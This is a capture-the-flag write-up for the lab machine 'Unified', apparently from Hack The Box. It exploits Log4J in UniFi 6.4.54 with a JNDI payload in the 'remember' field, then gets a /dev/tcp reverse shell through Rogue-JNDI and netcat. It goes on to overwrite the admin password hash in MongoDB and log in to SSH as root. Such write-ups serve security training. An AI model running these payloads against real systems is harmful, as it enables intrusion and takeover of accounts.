# Unified Write-up  
Prepared by: Sai Teja 

## Introduction
This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called "UniFi". This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called `remember`, giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.

---

## Enumeration
The first step is to scan the target IP address with Nmap to check what ports are open. We'll do this with the help of a program called Nmap. Here is a quick explanation of what each flag is and what it does.

- **-sC**: Performs a script scan using the default set of scripts.  
- **-sV**: Version detection  
- **-v**: Increases verbosity  

The scan reveals port **8080** open running an HTTP proxy. The proxy appears to redirect requests to port **8443**, which seems to be running an SSL web server.

The page title on 8443 is **"UniFi Network"** showing version **6.4.54**.

A Google search for **UniFi 6.4.54 exploit** reveals articles discussing Log4J exploitation in this version.

References:  
https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi  
https://nvd.nist.gov/vuln/detail/CVE-2021-44228  
https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation  

This vulnerability allows OS command injection.

To test for vulnerability, intercept the login POST request using FoxyProxy + BurpSuite, then modify the `remember` parameter.

---
<img width="1920" height="1020" alt="Screenshot 2026-01-06 130958" src="https://github.com/user-attachments/assets/61b5c22a-f489-4138-8b82-ad739774f73a" />




## Exploitation
Send incorrect credentials "`test:test`" just to capture the request.

Forward to **Repeater** (Ctrl + R).

Insert JNDI payload into the `remember` parameter.  
Because the POST body is JSON, the payload must be wrapped in quotes so it is parsed as a string:

```
"${jndi:ldap://<Your-IP>/whatever}"
```

Even if the response shows error, the payload may still execute.


<img width="582" height="309" alt="Screenshot 2026-01-06 12024756" src="https://github.com/user-attachments/assets/1afaa910-02f7-47e8-976d-8d91620e18f7" />

---

### Start tcpdump to detect callback:
```bash
sudo tcpdump -i tun0 port 389
```

Send the request > if you see packets → **vulnerable**.


<img width="1920" height="1020" alt="Screenshot 2026-01-06 130913" src="https://github.com/user-attachments/assets/ed7da21a-b85a-4eae-8343-6ae9c522af9b" />

---

### Install tools needed for full RCE:
- OpenJDK  
- Maven  

```bash
sudo apt-get install maven
```

Check version:

```bash
mvn -v
```

Clone Rogue-JNDI:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

This builds:  
`target/RogueJndi-1.1.jar`

---

## Build Reverse Shell Payload
Base64 encode reverse shell:

```bash
echo 'bash -c bash -i >&/dev/tcp/<Your-IP>/4444 0>&1' | base64
```

Start Rogue-JNDI:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_HERE}|{base64,-d}|{bash,-i}" --hostname "<Your-IP>"
```
<img width="1920" height="480" alt="Screenshot 2026-01-06 13093556" src="https://github.com/user-attachments/assets/1fde6682-12b9-4681-8add-41feb2b66aa0" />

Start listener:

```bash
nc -lvp 4444
```

Modify Burp payload:

```
${jndi:ldap://<Your-IP>:1389/o=tomcat}
```

<img width="892" height="378" alt="Screenshot 2026-01-06 12101056" src="https://github.com/user-attachments/assets/5d12f4cf-2f01-4804-bcef-f70ef42c3297" />

Send.  
Rogue-JNDI receives connection → reverse shell spawns.


<img width="1920" height="185" alt="Screenshot 2026-01-06 13062956" src="https://github.com/user-attachments/assets/66a890fb-396c-4e0c-abbc-ae88a44abe15" />


Upgrade shell:

```bash
script /dev/null -c bash
```

<img width="1920" height="189" alt="Screenshot 2026-01-06 13064445" src="https://github.com/user-attachments/assets/68ab6663-5962-4553-98df-b107728c199c" />

Navigate and read user flag:

```bash
cd /home/Michael
cat user.txt
```
<img width="1920" height="644" alt="56" src="https://github.com/user-attachments/assets/1389b2be-8320-4360-8afc-17afa6c2babc" />

---

## Privilege Escalation

Check MongoDB:

```bash
ps aux | grep mongo
```

<img width="1920" height="219" alt="122" src="https://github.com/user-attachments/assets/0e7d8c23-050f-4222-b00d-37bb252118da" />

Connect to DB:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Look for user `"Administrator"` and field `"x_shadow"`.


<img width="1032" height="359" alt="2132123" src="https://github.com/user-attachments/assets/8c1554a0-a33e-4163-87a9-7a4ed875b9e7" />

### Generate SHA-512 password hash:
```bash
mkpasswd -m sha-512 Password1234
```


<img width="1920" height="192" alt="526333" src="https://github.com/user-attachments/assets/bd03210e-54dd-4307-a3a9-c6539fba554b" />

Replace admin hash:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<NEW_HASH>"}})'

```

<img width="1920" height="308" alt="553453" src="https://github.com/user-attachments/assets/eca3e825-7943-43da-b614-1991388e5f01" />


Verify updated hash.

Login to UniFi admin panel using your new password.

---

## Getting Root Password
Navigate to:

**Settings → Site → SSH Authentication**

You will see plaintext root password:

```
NotACrackablePassword4U2022
```


<img width="1920" height="701" alt="Screenshot 2026-01-06 1304015123" src="https://github.com/user-attachments/assets/ef6cdfa9-1845-463f-a379-d762d8cbd905" />


SSH into machine:

```bash
ssh root@10.129.96.149
```


<img width="1920" height="393" alt="Screenshot 2026-01-06 13060454556" src="https://github.com/user-attachments/assets/8fc32778-45e7-48b1-b94f-db204327e978" />

Read root flag:

```bash
cat /root/root.txt
```


<img width="1920" height="197" alt="11521231" src="https://github.com/user-attachments/assets/6e25b832-a423-4133-bb13-7116768de274" />


---

## End
Congratulations — you have completed the Unified box.
